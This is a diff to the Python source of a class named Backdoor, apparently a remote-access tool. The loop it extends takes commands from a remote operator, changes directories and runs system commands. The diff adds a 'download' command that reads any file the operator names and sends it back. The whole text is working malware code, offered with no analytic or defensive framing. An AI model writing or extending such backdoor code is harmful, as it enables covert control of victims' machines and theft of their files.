@@ -33,14 +33,21 @@ class Backdoor:
         os.chdir(path)
         return "[+] Changing working directory to " + path
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return file.read()
+
     def run(self):
         while True:
             command_received = self.reliable_receive()
             if command_received[0] == "exit":
+                command_result = ""
                 self.connection.close()
                 exit()
             elif command_received[0] == "cd" and len(command_received) > 1:
                 command_result = self.change_working_directory(command_received[1])
+            elif command_received[0] == "download":
+                command_result = self.read_file(command_received[1])
             else:
                 command_result = self.execute_system_command(command_received)
 
